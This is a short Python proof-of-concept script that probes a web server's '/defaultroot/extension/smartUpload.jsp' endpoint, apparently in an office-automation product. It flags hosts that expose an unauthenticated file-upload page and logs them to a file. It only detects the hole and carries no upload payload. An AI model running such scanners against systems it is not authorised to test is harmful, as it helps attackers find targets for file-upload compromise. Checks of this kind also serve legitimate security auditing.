import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()
from colorama import init,Fore
init(autoreset=True)

def poc(url):
    try:
        target = urljoin(url,"/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&")
        header = {
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Cache-Control": "max-age=0",
            "ccept-Encoding": "gzip, deflate",
            "Connection": "close",
        }
        res = requests.post(url=target,headers=header,verify=False,timeout=5)
        if res.status_code == 200 and "上传附件" in res.text:
            print(Fore.GREEN + url +'[+]存在smartUpload上传页面可自行上传文件')
            with open(r'output.txt', 'a+') as w:
                w.write(url+"存在smartupload上传漏洞"'\n')
            print("[" + "-" * 80 + "]")            
        else:
            print(Fore.RED + url +'[-]不存在漏洞')
            print("[" + "-" * 80 + "]")
    except Exception as err:
        print(err)